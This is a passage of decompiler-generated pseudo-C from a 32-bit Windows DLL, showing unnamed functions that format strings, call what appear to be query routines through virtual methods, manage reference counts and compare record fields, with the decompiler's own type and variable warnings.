  sub_10033FA1(this + 11);
  sub_1003373D(this + 1);
}
// 100315F6: variable 'v1' is possibly undefined
// 10103588: using guessed type int (__thiscall *off_10103588[2])(void *Block, char);

//----- (1003163A) --------------------------------------------------------
int __thiscall sub_1003163A(_DWORD *this, int a2, int a3)
{
  int v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8; // esi
  int *v9; // ecx
  _DWORD *v11; // esi
  _DWORD *v12; // eax
  wchar_t *v13; // eax
  int v14; // [esp-8h] [ebp-48h]
  int v15; // [esp-4h] [ebp-44h]
  int v16[2]; // [esp+10h] [ebp-30h] BYREF
  unsigned __int8 v17[8]; // [esp+18h] [ebp-28h] BYREF
  void *v18[2]; // [esp+20h] [ebp-20h] BYREF
  int v19; // [esp+28h] [ebp-18h] BYREF
  int v20; // [esp+2Ch] [ebp-14h] BYREF
  char v21; // [esp+33h] [ebp-Dh]
  int v22; // [esp+3Ch] [ebp-4h]

  v22 = 0;
  v4 = a2;
  if ( !a2 )
  {
    v5 = sub_1000E7F7(&v20, 1, 0);
    LOBYTE(v22) = 1;
    goto LABEL_3;
  }
  v6 = sub_10029C4A(a2, &v19);
  LOBYTE(v22) = 2;
  v21 = (*(int (__thiscall **)(_DWORD *, _DWORD *))(this[1] + 8))(this + 1, v6);
  LOBYTE(v22) = 0;
  sub_1000D3AD(&v19);
  if ( v21 )
  {
    v7 = sub_10029C4A(v4, &v19);
    LOBYTE(v22) = 3;
    v8 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, _DWORD *))(this[1] + 16))(this + 1, v7);
    LOBYTE(v22) = 0;
    v9 = &v19;
  }
  else
  {
    sub_1000D17D(v17, &word_101769F8);
    LOBYTE(v22) = 4;
    v11 = sub_10029C4A(v4, v16);
    LOBYTE(v22) = 5;
    v12 = sub_1000D7AD(&v19, *(_DWORD *)(v4 + 28));
    LOBYTE(v22) = 6;
    v15 = *(_DWORD *)(v11[1] + 12);
    v14 = *(_DWORD *)(v12[1] + 12);
    v13 = (wchar_t *)sub_1000CC40((int)&unk_10176A00);
    sub_1000D6C3((int)v17, v13, v14, v15);
    LOBYTE(v22) = 5;
    sub_1000D3AD(&v19);
    LOBYTE(v22) = 4;
    sub_1000D3AD(v16);
    sub_100507F4((int)(this + 21), (int *)v18, v17);
    LOBYTE(v22) = 7;
    if ( *((_BYTE *)v18[0] + 4) || sub_10053451(0, *((int **)v18[0] + 2)) == 5 )
    {
      v5 = sub_1000E7F7(&v20, 1, 0);
      LOBYTE(v22) = 8;
LABEL_3:
      sub_10007882((int)v5);
    }
    v8 = sub_100500E2((int **)v18[0]);
    LOBYTE(v22) = 4;
    sub_1003406C(v18);
    LOBYTE(v22) = 0;
    v9 = (int *)v17;
  }
  sub_1000D3AD(v9);
  v22 = -1;
  sub_1000780D(&a2);
  return v8;
}
// 1003163A: using guessed type _DWORD var_14;
// 1003163A: using guessed type unsigned __int8 var_28[8];

//----- (100317AD) --------------------------------------------------------
int __thiscall sub_100317AD(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int v5; // edx
  _DWORD *v6; // eax
  _DWORD *v7; // esi
  bool v8; // bl
  _DWORD *v9; // eax
  int v10; // esi
  int v12; // [esp-8h] [ebp-54h] BYREF
  int v13; // [esp-4h] [ebp-50h]
  int v14[2]; // [esp+10h] [ebp-3Ch] BYREF
  int v15; // [esp+28h] [ebp-24h] BYREF
  int v16; // [esp+2Ch] [ebp-20h]
  void *v17; // [esp+34h] [ebp-18h]
  int v18; // [esp+48h] [ebp-4h]

  v18 = 0;
  if ( !a3 )
  {
    v4 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v18) = 1;
    v13 = 117;
    sub_10007882((int)v4);
  }
  v15 = -1;
  v16 = -1;
  LOBYTE(v18) = 2;
  v13 = (int)this;
  v12 = (int)this;
  v17 = &v12;
  sub_10011AE0(&a3, &v12);
  LOBYTE(v18) = 2;
  v15 = sub_1003163A(a2, v12, v13);
  v16 = v5;
  v18 = 0;
  v6 = sub_10029C4A(a3, v14);
  LOBYTE(v18) = 13;
  v7 = a2 + 1;
  v8 = (*(unsigned __int8 (__thiscall **)(_DWORD *, _DWORD *))(a2[1] + 8))(a2 + 1, v6) == 0;
  LOBYTE(v18) = 0;
  sub_1000D3AD(v14);
  if ( v8 )
  {
    v9 = sub_10029C4A(a3, v14);
    LOBYTE(v18) = 14;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int *))(*v7 + 24))(v7, v9, &v15);
    LOBYTE(v18) = 0;
    sub_1000D3AD(v14);
  }
  v10 = v15;
  v18 = -1;
  sub_1000780D(&a3);
  return v10;
}
// 10031808: variable 'v5' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1003198C) --------------------------------------------------------
char __thiscall sub_1003198C(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int v6; // [esp-8h] [ebp-2Ch] BYREF
  int v7; // [esp-4h] [ebp-28h]
  void *v8; // [esp+10h] [ebp-14h]
  int v9; // [esp+20h] [ebp-4h]

  v9 = 0;
  if ( !a3 )
  {
    v4 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v9) = 1;
    v7 = 144;
    sub_10007882((int)v4);
  }
  LOBYTE(v9) = 2;
  v7 = (int)this;
  v6 = (int)this;
  v8 = &v6;
  sub_10011AE0(&a3, &v6);
  LOBYTE(v9) = 2;
  sub_1003163A(a2, v6, v7);
  v9 = -1;
  sub_1000780D(&a3);
  return 0;
}

//----- (10031A0F) --------------------------------------------------------
char __usercall sub_10031A0F@<al>(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  char v4; // bl
  wchar_t *v6; // eax
  void **v7; // eax
  void *v8; // esi
  _DWORD *v9; // eax
  void *v10; // ecx
  int v11; // esi
  int v12; // edx
  wchar_t *v13; // eax
  int v14; // edx
  int v15; // eax
  int v16; // [esp-10h] [ebp-B4h]
  int v17; // [esp-Ch] [ebp-B0h]
  int v18; // [esp-Ch] [ebp-B0h]
  void *v19; // [esp-8h] [ebp-ACh] BYREF
  int v20; // [esp-4h] [ebp-A8h]
  int v21; // [esp+Ch] [ebp-98h]
  void *v22[2]; // [esp+10h] [ebp-94h] BYREF
  int *v23; // [esp+18h] [ebp-8Ch] BYREF
  int v24[2]; // [esp+1Ch] [ebp-88h] BYREF
  void *v25[2]; // [esp+24h] [ebp-80h] BYREF
  void *v26; // [esp+2Ch] [ebp-78h] BYREF
  int v27; // [esp+30h] [ebp-74h]
  LONG v28[2]; // [esp+3Ch] [ebp-68h] BYREF
  _DWORD ArgList[2]; // [esp+44h] [ebp-60h]
  void *v30; // [esp+4Ch] [ebp-58h]
  int v31; // [esp+50h] [ebp-54h]
  _DWORD v32[4]; // [esp+5Ch] [ebp-48h] BYREF
  int v33[5]; // [esp+6Ch] [ebp-38h] BYREF
  int v34[6]; // [esp+80h] [ebp-24h] BYREF
  int v35; // [esp+A0h] [ebp-4h]

  sub_10032A76(v28, *(_DWORD *)(a2 + 112));
  v35 = 0;
  v3 = *(_DWORD *)(a2 + 44);
  v23 = (int *)(a2 + 44);
  if ( (*(unsigned __int8 (__stdcall **)(LONG *))(v3 + 4))(v28) )
  {
    v4 = 0;
LABEL_3:
    v35 = -1;
    sub_1000646B(v28);
    return v4;
  }
  sub_1000D17D(v24, &word_10176B58);
  LOBYTE(v35) = 1;
  if ( *(_BYTE *)(a2 + 40) )
  {
    sub_1000B261((int)v28, (int)v34, 0);
    LOBYTE(v35) = 2;
    sub_10032E71(&v26);
    LOBYTE(v35) = 3;
    sub_10034F16(&v26, (int)v34);
    v20 = v31;
    v19 = v30;
    v17 = ArgList[0];
    v6 = (wchar_t *)sub_1000CC40((int)&unk_10176B60);
    sub_1000D6C3((int)v24, v6, v17, v19, v20);
    sub_1005083E((void *)(a2 + 84), (int *)v22, (unsigned __int8 *)v24, &v26);
    LOBYTE(v35) = 4;
    v4 = *((_BYTE *)v22[0] + 4);
    if ( !v4 )
      (*(void (__thiscall **)(int *, LONG *))(*v23 + 8))(v23, v28);
    LOBYTE(v35) = 3;
    sub_1003406C(v22);
    LOBYTE(v35) = 2;
    sub_10032EA8(&v26);
    LOBYTE(v35) = 1;
    sub_1000B3DF(v34);
    LOBYTE(v35) = 0;
    sub_1000D3AD(v24);
    goto LABEL_3;
  }
  v7 = (void **)(a1 + 620);
  v8 = *(void **)(a1 + 624);
  v22[1] = v8;
  v22[0] = *v7;
  InterlockedIncrement((volatile LONG *)v8);
  LOBYTE(v35) = 5;
  if ( !v22[0] )
  {
    v9 = sub_1000E7F7(&v23, 1, 0);
    LOBYTE(v35) = 6;
    v20 = 193;
    sub_10007882((int)v9);
  }
  v26 = &v19;
  v20 = (int)v8;
  v19 = v22[0];
  InterlockedIncrement((volatile LONG *)v8);
  LOBYTE(v35) = 5;
  v11 = sub_100317AD(v10, (_DWORD *)a2, (int)v19, v20);
  v27 = v12;
  sub_1000B261((int)v28, (int)v33, 0);
  LOBYTE(v35) = 8;
  sub_10032E71(v32);
  LOBYTE(v35) = 9;
  sub_10034F16(v32, (int)v33);
  v20 = v31;
  v19 = v30;
  v18 = ArgList[0];
  v16 = v27;
  v13 = (wchar_t *)sub_1000CC40((int)&unk_10176C28);
  sub_1000D6C3((int)v24, v13, v11, v16, v18);
  sub_1005083E((void *)(a2 + 84), (int *)v25, (unsigned __int8 *)v24, v32);
  LOBYTE(v35) = 10;
  if ( *((_BYTE *)v25[0] + 4) )
  {
    LOBYTE(v35) = 9;
    sub_1003406C(v25);
    LOBYTE(v35) = 8;
    sub_10032EA8(v32);
    LOBYTE(v35) = 5;
    sub_1000B3DF(v33);
    LOBYTE(v35) = 1;
    sub_1000780D(v22);
    LOBYTE(v35) = 0;
    sub_1000D3AD(v24);
    v4 = 1;
    goto LABEL_3;
  }
  if ( sub_100500E2((int **)v25[0]) == 1 && !v14 )
  {
    v15 = *v23;
    HIBYTE(v21) = 0;
    (*(void (__thiscall **)(int *, LONG *))(v15 + 8))(v23, v28);
  }
  else
  {
    HIBYTE(v21) = 1;
  }
  LOBYTE(v35) = 9;
  sub_1003406C(v25);
  LOBYTE(v35) = 8;
  sub_10032EA8(v32);
  LOBYTE(v35) = 5;
  sub_1000B3DF(v33);
  LOBYTE(v35) = 1;
  sub_1000780D(v22);
  LOBYTE(v35) = 0;
  sub_1000D3AD(v24);
  v35 = -1;
  sub_1000646B(v28);
  return HIBYTE(v21);
}
// 10031BF9: variable 'v10' is possibly undefined
// 10031C0B: variable 'v12' is possibly undefined
// 10031CF2: variable 'v14' is possibly undefined
// 10031A0F: using guessed type LONG var_68[2];
// 10031A0F: using guessed type int var_24[6];
// 10031A0F: using guessed type _DWORD ArgList[2];
// 10031A0F: using guessed type int var_38[5];
// 10031A0F: using guessed type _DWORD var_48[4];

//----- (10031D8B) --------------------------------------------------------
void __usercall sub_10031D8B(int a1@<esi>)
{
  int v1; // [esp+0h] [ebp-34h] BYREF
  LONG v2[12]; // [esp+4h] [ebp-30h] BYREF

  sub_10032A76(v2, *(_DWORD *)(a1 + 112));
  v2[11] = 0;
  (*(void (__thiscall **)(int, LONG *))(*(_DWORD *)(a1 + 44) + 8))(a1 + 44, v2);
  v2[10] = -1;
  sub_1000646B(&v1);
}

//----- (10031DF3) --------------------------------------------------------
void __fastcall sub_10031DF3(int a1, int a2, int a3)
{
  wchar_t *v4; // eax
  int v5; // [esp-10h] [ebp-7Ch]
  int v6; // [esp-Ch] [ebp-78h]
  int v7; // [esp-8h] [ebp-74h]
  int v8[2]; // [esp+10h] [ebp-5Ch] BYREF
  _DWORD v9[4]; // [esp+18h] [ebp-54h] BYREF
  int v10[5]; // [esp+28h] [ebp-44h] BYREF
  LONG v11[2]; // [esp+3Ch] [ebp-30h] BYREF
  _DWORD ArgList[2]; // [esp+44h] [ebp-28h]
  int v13; // [esp+4Ch] [ebp-20h]
  int v14; // [esp+50h] [ebp-1Ch]
  int v15; // [esp+68h] [ebp-4h]

  sub_10032A76(v11, *(_DWORD *)(a2 + 112));
  v15 = 0;
  sub_1000B261((int)v11, (int)v10, 0);
  LOBYTE(v15) = 1;
  sub_10032E71(v9);
  LOBYTE(v15) = 2;
  sub_1000D17D(v8, &word_10176D18);
  LOBYTE(v15) = 3;
  sub_10034F16(v9, (int)v10);
  v7 = v14;
  v6 = v13;
  v5 = ArgList[0];
  v4 = (wchar_t *)sub_1000CC40((int)&unk_10176D20);
  sub_1000D6C3((int)v8, v4, v5, v6, v7, a3);
  sub_10050743(a2 + 84, (unsigned __int8 *)v8, v9);
  LOBYTE(v15) = 2;
  sub_1000D3AD(v8);
  LOBYTE(v15) = 1;
  sub_10032EA8(v9);
  LOBYTE(v15) = 0;
  sub_1000B3DF(v10);
  v15 = -1;
  sub_1000646B(v11);
}
// 10031DF3: using guessed type LONG var_30[2];
// 10031DF3: using guessed type int var_44[5];
// 10031DF3: using guessed type _DWORD var_54[4];
// 10031DF3: using guessed type _DWORD ArgList[2];

//----- (10031EFC) --------------------------------------------------------
void __userpurge sub_10031EFC(int a1@<ebp>, void *a2)
{
  int v2; // esi
  __int32 v3; // eax
  wchar_t *v4; // eax
  _DWORD *v5; // eax
  int v6; // edi
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  wchar_t *v10; // eax
  int v11; // esi
  _DWORD *v12; // eax
  wchar_t *v13; // eax
  int v14; // ecx
  int v15; // [esp-20h] [ebp-74h] BYREF
  int v16; // [esp-1Ch] [ebp-70h]
  int v17; // [esp-18h] [ebp-6Ch]
  int v18; // [esp-14h] [ebp-68h]
  int v19; // [esp-10h] [ebp-64h]
  int v20; // [esp-Ch] [ebp-60h] BYREF
  int v21; // [esp-8h] [ebp-5Ch]

  *(_DWORD *)(a1 + 60) = sub_1001C764();
  *(_BYTE *)(a1 + 107) = 0;
  *(_DWORD *)(a1 + 100) = 0;
  v2 = *(_DWORD *)(a1 + 116);
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)(v2 + 48) + 4))(v2 + 48);
  *(_DWORD *)(a1 + 92) = v3;
  sub_10029BC2(v3);
  while ( !*(_BYTE *)(a1 + 107) )
  {
    *(_DWORD *)(a1 - 4) = 0;
    *(_DWORD *)(a1 + 100) = 0;
    v4 = (wchar_t *)sub_1000CC40((int)&unk_10176E18);
    sub_1000D17D((_DWORD *)(a1 + 28), v4);
    *(_BYTE *)(a1 - 4) = 1;
    *(_DWORD *)(a1 + 80) = v2 + 84;
    sub_100506BD(v2 + 84, (unsigned __int8 *)(a1 + 28));
    *(_BYTE *)(a1 - 4) = 0;
    sub_1000D3AD((int *)(a1 + 28));
    (*(void (__thiscall **)(int, int))(*(_DWORD *)(v2 + 44) + 20))(v2 + 44, a1 + 72);
    *(_BYTE *)(a1 - 4) = 2;
    while ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 72) + 4))(*(_DWORD *)(a1 + 72))
         && *(_DWORD *)(a1 + 92) > *(_DWORD *)(a1 + 100) )
    {
      v5 = (_DWORD *)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 72) + 12))(*(_DWORD *)(a1 + 72));
      sub_100322DB(v5, (_DWORD *)(a1 - 48));
      *(_BYTE *)(a1 - 4) = 4;
      sub_1000B261(a1 - 48, a1 - 68, 0);
      *(_BYTE *)(a1 - 4) = 5;
      sub_10032E71((_DWORD *)(a1 + 8));
      *(_BYTE *)(a1 - 4) = 6;
      sub_10034F16((void *)(a1 + 8), a1 - 68);
      sub_1000D17D((_DWORD *)(a1 + 64), &word_10176E78);
      *(_BYTE *)(a1 - 4) = 7;
      v21 = *(_DWORD *)(a1 + 60);
      v6 = *(_DWORD *)(a1 + 116);
      v20 = *(_BYTE *)(v6 + 40) == 0;
      v19 = *(_DWORD *)(a1 - 28);
      v18 = *(_DWORD *)(a1 - 32);
      v17 = *(_DWORD *)(a1 - 40);
      v16 = v7;
      v15 = v7;
      *(_DWORD *)(a1 + 96) = &v15;
      sub_10011AE0((_DWORD *)(a1 - 24), &v15);
      *(_BYTE *)(a1 - 4) = 8;
      *(_BYTE *)(a1 - 4) = 7;
      v8 = sub_1003163A((_DWORD *)v6, v15, v16);
      v16 = v9;
      v15 = v8;
      v10 = (wchar_t *)sub_1000CC40((int)&unk_10176E80);
      sub_1000D6C3(a1 + 64, v10);
      sub_10050743(*(_DWORD *)(a1 + 80), (unsigned __int8 *)(a1 + 64), (void *)(a1 + 8));
      *(_BYTE *)(a1 - 4) = 6;
      sub_1000D3AD((int *)(a1 + 64));
      *(_BYTE *)(a1 - 4) = 5;
      sub_10032EA8((_DWORD *)(a1 + 8));
      *(_BYTE *)(a1 - 4) = 4;
      sub_1000B3DF((int *)(a1 - 68));
      *(_BYTE *)(a1 - 4) = 2;
      sub_1000646B((int *)(a1 - 48));
      v11 = *(_DWORD *)(a1 + 72);
      if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)v11 + 4))() )
      {
        v12 = sub_1000E8EF((_DWORD *)(a1 + 24));
        *(_BYTE *)(a1 - 4) = 3;
        v21 = 104;
        sub_100078FE((int)v12);
      }
      (*(void (__thiscall **)(int))(*(_DWORD *)v11 + 16))(v11);
      ++*(_DWORD *)(a1 + 100);
    }
    *(_BYTE *)(a1 - 4) = 0;
    sub_1003406C((void **)(a1 + 72));
    v13 = (wchar_t *)sub_1000CC40((int)&unk_10176FA8);
    sub_1000D17D((_DWORD *)(a1 + 44), v13);
    *(_BYTE *)(a1 - 4) = 9;
    sub_100506BD(*(_DWORD *)(a1 + 80), (unsigned __int8 *)(a1 + 44));
    *(_BYTE *)(a1 - 4) = 0;
    sub_1000D3AD((int *)(a1 + 44));
    (*(void (__thiscall **)(int))(*(_DWORD *)(*(_DWORD *)(a1 + 116) + 44) + 28))(*(_DWORD *)(a1 + 116) + 44);
    *(_BYTE *)(a1 + 107) = 1;
    v21 = v14;
    v20 = v14;
    *(_DWORD *)(a1 + 96) = &v20;
    sub_1000728E(&v20, 0);
    *(_BYTE *)(a1 - 4) = 10;
    v19 = *(_DWORD *)(a1 + 100);
    LOBYTE(v18) = 9;
    *(_BYTE *)(a1 - 4) = 0;
    sub_1004F7E6((_DWORD *)dword_10182DE8, v18, v19, v20, v21);
    *(_DWORD *)(a1 - 4) = -1;
    v2 = *(_DWORD *)(a1 + 116);
  }
}
// 10032009: variable 'v7' is possibly undefined
// 10032027: variable 'v9' is possibly undefined
// 100320FB: variable 'v14' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (100322DB) --------------------------------------------------------
_DWORD *__userpurge sub_100322DB@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  volatile LONG *v3; // [esp-4h] [ebp-20h]

  sub_1000D372(a2, (int)a1);
  a2[2] = a1[2];
  a2[4] = a1[4];
  a2[5] = a1[5];
  a2[7] = a1[7];
  v3 = (volatile LONG *)a2[7];
  a2[6] = a1[6];
  InterlockedIncrement(v3);
  return a2;
}

//----- (1003232A) --------------------------------------------------------
unsigned int __stdcall sub_1003232A(int a1, unsigned int ArgList)
{
  wchar_t *v2; // eax
  int *v3; // eax
  unsigned int v4; // edi
  wchar_t *v5; // eax
  int v7[2]; // [esp+14h] [ebp-28h] BYREF
  int v8[2]; // [esp+1Ch] [ebp-20h] BYREF
  void *v9[3]; // [esp+24h] [ebp-18h] BYREF
  int v10; // [esp+38h] [ebp-4h]

  v2 = (wchar_t *)sub_1000CC40((int)&unk_10177048);
  sub_1000D17D(v8, v2);
  v10 = 0;
  v3 = sub_100507F4(a1 + 84, (int *)v9, (unsigned __int8 *)v8);
  LOBYTE(v10) = 1;
  v4 = sub_100500E2((int **)*v3);
  LOBYTE(v10) = 0;
  sub_1003406C(v9);
  v10 = -1;
  sub_1000D3AD(v8);
  sub_1000D17D(v7, &word_101770A4);
  v10 = 2;
  v5 = (wchar_t *)sub_1000CC40((int)&unk_101770A8);
  sub_1000D6C3((int)v7, v5, ArgList);
  sub_100506BD(a1 + 84, (unsigned __int8 *)v7);
  if ( v4 >= ArgList )
    v4 = ArgList;
  v10 = -1;
  sub_1000D3AD(v7);
  return v4;
}

//----- (10032417) --------------------------------------------------------
void *__thiscall sub_10032417(int this, void *a2, int a3, int a4, volatile LONG *lpAddend)
{
  int v6; // esi
  _DWORD *v7; // eax
  void *v8; // ecx
  int v9; // esi
  int v10; // edx
  int v11; // ebx
  bool v12; // zf
  int v13; // eax
  wchar_t *v14; // eax
  LONG *v15; // eax
  int v17; // [esp-Ch] [ebp-6Ch]
  int v18; // [esp-8h] [ebp-68h] BYREF
  int v19; // [esp-4h] [ebp-64h]
  int v20[5]; // [esp+10h] [ebp-50h] BYREF
  int v21[5]; // [esp+24h] [ebp-3Ch] BYREF
  void *v22[2]; // [esp+38h] [ebp-28h] BYREF
  int v23[3]; // [esp+40h] [ebp-20h] BYREF
  int v24; // [esp+4Ch] [ebp-14h]
  int v25; // [esp+5Ch] [ebp-4h]

  v24 = 0;
  v25 = 1;
  v6 = a4;
  v19 = 0;
  if ( !a4 )
  {
    v7 = sub_1000E7F7(&a3, 1, v19);
    LOBYTE(v25) = 2;
    v19 = 340;
    sub_10007882((int)v7);
  }
  sub_1000B1F3(0, (int)v21, (void *)v19);
  LOBYTE(v25) = 3;
  v23[2] = (int)&v18;
  v19 = (int)lpAddend;
  v18 = v6;
  InterlockedIncrement(lpAddend);
  LOBYTE(v25) = 3;
  v9 = sub_100317AD(v8, (_DWORD *)this, v18, v19);
  v11 = v10;
  sub_1000D17D(v23, &word_10177184);
  LOBYTE(v25) = 5;
  v12 = *(_BYTE *)(this + 40) == 0;
  v13 = *(_DWORD *)(*(_DWORD *)(a3 + 4) + 12);
  v19 = v11;
  v18 = v9;
  v17 = v13;
  if ( v12 )
    v14 = (wchar_t *)sub_1000CC40((int)&unk_10177248);
  else
    v14 = (wchar_t *)sub_1000CC40((int)&unk_10177188);
  sub_1000D6C3((int)v23, v14, v17, v18, v19);
  sub_100507F4(this + 84, (int *)v22, (unsigned __int8 *)v23);
  LOBYTE(v25) = 6;
  if ( *((_BYTE *)v22[0] + 4) )
  {
    sub_1000B1F3((void *)4, (int)a2, &unk_101769A0);
  }
  else
  {
    if ( sub_10053451(0, *((int **)v22[0] + 2)) == 5 )
    {
      v15 = (LONG *)sub_1000B1F3((void *)4, (int)v20, &unk_101769A0);
      LOBYTE(v25) = 8;
    }
    else
    {
      v15 = (LONG *)sub_1005011E((int **)v22[0], v20);
      LOBYTE(v25) = 7;
    }
    sub_1000B3BD(v15, (int)v21);
    LOBYTE(v25) = 6;
    sub_1000B3DF(v20);
    sub_1000B36F(v21, (int)a2);
  }
  v24 = 1;
  LOBYTE(v25) = 5;
  sub_1003406C(v22);
  LOBYTE(v25) = 3;
  sub_1000D3AD(v23);
  LOBYTE(v25) = 1;
  sub_1000B3DF(v21);
  LOBYTE(v25) = 0;
  sub_1000780D(&a4);
  return a2;
}
// 1003247E: variable 'v8' is possibly undefined
// 1003248E: variable 'v10' is possibly undefined
// 10032417: using guessed type int var_3C[5];
// 10032417: using guessed type int var_50[5];

//----- (1003258C) --------------------------------------------------------
void __fastcall sub_1003258C(int a1, int a2, int a3, int a4, volatile LONG *lpAddend)
{
  _DWORD *v7; // eax
  void *v8; // ecx
  int v9; // ebx
  void *v10; // edx
  bool v11; // zf
  int v12; // eax
  wchar_t *v13; // eax
  int v14; // [esp-Ch] [ebp-50h]
  int v15; // [esp-8h] [ebp-4Ch] BYREF
  int v16; // [esp-4h] [ebp-48h]
  _DWORD v17[4]; // [esp+10h] [ebp-34h] BYREF
  int v18[3]; // [esp+20h] [ebp-24h] BYREF
  void *v19; // [esp+2Ch] [ebp-18h]
  int v20; // [esp+40h] [ebp-4h]

  v20 = 0;
  if ( !a4 )
  {
    v7 = sub_1000E7F7(&a3, 1, 0);
    LOBYTE(v20) = 1;
    v16 = 380;
    sub_10007882((int)v7);
  }
  v19 = &v15;
  v16 = (int)lpAddend;
  v15 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v20) = 0;
  v9 = sub_100317AD(v8, (_DWORD *)a2, v15, v16);
  v19 = v10;
  sub_10032E71(v17);
  LOBYTE(v20) = 3;
  sub_10034F16(v17, a3);
  sub_1000D17D(v18, &word_101772F8);
  LOBYTE(v20) = 4;
  v11 = *(_BYTE *)(a2 + 40) == 0;
  v16 = (int)v19;
  v12 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
  v15 = v9;
  v14 = v12;
  if ( v11 )
    v13 = (wchar_t *)sub_1000CC40((int)&unk_101773E8);
  else
    v13 = (wchar_t *)sub_1000CC40((int)&unk_10177300);
  sub_1000D6C3((int)v18, v13, v14, v15, v16);
  sub_10050743(a2 + 84, (unsigned __int8 *)v18, v17);
  LOBYTE(v20) = 3;
  sub_1000D3AD(v18);
  LOBYTE(v20) = 0;
  sub_10032EA8(v17);
  v20 = -1;
  sub_1000780D(&a4);
}
// 100325E0: variable 'v8' is possibly undefined
// 100325EB: variable 'v10' is possibly undefined
// 1003258C: using guessed type _DWORD var_34[4];

//----- (1003267E) --------------------------------------------------------
void __userpurge sub_1003267E(__int32 a1@<eax>, int a2)
{
  int v2; // ecx
  wchar_t *v3; // eax
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax
  wchar_t *v12; // eax
  int v13; // [esp-8h] [ebp-34h] BYREF
  int v14; // [esp-4h] [ebp-30h]
  void *v15; // [esp+10h] [ebp-1Ch]
  int v16[3]; // [esp+14h] [ebp-18h] BYREF
  int v17; // [esp+28h] [ebp-4h]

  sub_10029BC2(a1);
  sub_1000D17D(v16, &word_101773E4);
  v17 = 0;
  v14 = v2;
  v13 = v2;
  v15 = &v13;
  sub_1000728E(&v13, 0);
  LOBYTE(v17) = 0;
  sub_1004F292((_DWORD *)dword_10182DE8, 8, (int)v16, v13, v14);
  v17 = -1;
  sub_1000D3AD(v16);
  v3 = (wchar_t *)sub_1000CC40((int)&unk_101774C0);
  sub_1000D17D(v16, v3);
  v17 = 2;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v4 = (wchar_t *)sub_1000CC40((int)&unk_101775C8);
  sub_1000D17D(v16, v4);
  v17 = 3;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v5 = (wchar_t *)sub_1000CC40((int)&unk_101776D0);
  sub_1000D17D(v16, v5);
  v17 = 4;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v6 = (wchar_t *)sub_1000CC40((int)&unk_10177798);
  sub_1000D17D(v16, v6);
  v17 = 5;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v7 = (wchar_t *)sub_1000CC40((int)&unk_101778B0);
  sub_1000D17D(v16, v7);
  v17 = 6;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v8 = (wchar_t *)sub_1000CC40((int)&unk_10177998);
  sub_1000D17D(v16, v8);
  v17 = 7;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v9 = (wchar_t *)sub_1000CC40((int)&unk_10177B40);
  sub_1000D17D(v16, v9);
  v17 = 8;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v10 = (wchar_t *)sub_1000CC40((int)&unk_10177C30);
  sub_1000D17D(v16, v10);
  v17 = 9;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v11 = (wchar_t *)sub_1000CC40((int)&unk_10177CE0);
  sub_1000D17D(v16, v11);
  v17 = 10;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
  v12 = (wchar_t *)sub_1000CC40((int)&unk_10177E18);
  sub_1000D17D(v16, v12);
  v17 = 11;
  sub_100506BD(a2 + 84, (unsigned __int8 *)v16);
  v17 = -1;
  sub_1000D3AD(v16);
}
// 100326C2: variable 'v2' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (10032933) --------------------------------------------------------
BOOL __usercall sub_10032933@<eax>(_DWORD *a1@<edi>, _DWORD *a2@<esi>)
{
  return !sub_1000D65C((int)a2, (int)a1) && a1[2] == a2[2] && a1[4] == a2[4] && a1[5] == a2[5] && a1[6] == a2[6];
}

//----- (10032967) --------------------------------------------------------
bool __fastcall sub_10032967(_DWORD *a1, _DWORD *a2)
{
  unsigned int v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // eax
  unsigned int v8; // edx
  int v9; // ecx
  int v10; // ebx
  _DWORD *v11; // ebx
  _DWORD *v12; // eax
  _DWORD *v13; // esi
  _DWORD *v14; // eax
  bool v15; // bl
  int v16[2]; // [esp+10h] [ebp-20h] BYREF
  int v17[5]; // [esp+18h] [ebp-18h] BYREF
  int v18; // [esp+2Ch] [ebp-4h]

  if ( sub_1000D65C((int)a1, (int)a2) )
    return sub_1000D64D((int)a1, (int)a2);
  v5 = a2[2];
  v6 = a1[2];
  if ( v5 != v6 )
    return v5 < v6;
  v7 = a2[4];
  v8 = a1[4];
  v9 = a2[5];
  v10 = a1[5];
  if ( v7 != v8 || v9 != v10 )
    return v9 <= v10 && (v9 < v10 || v7 < v8);
  v11 = sub_10029C4A(a1[6], v16);
  v18 = 0;
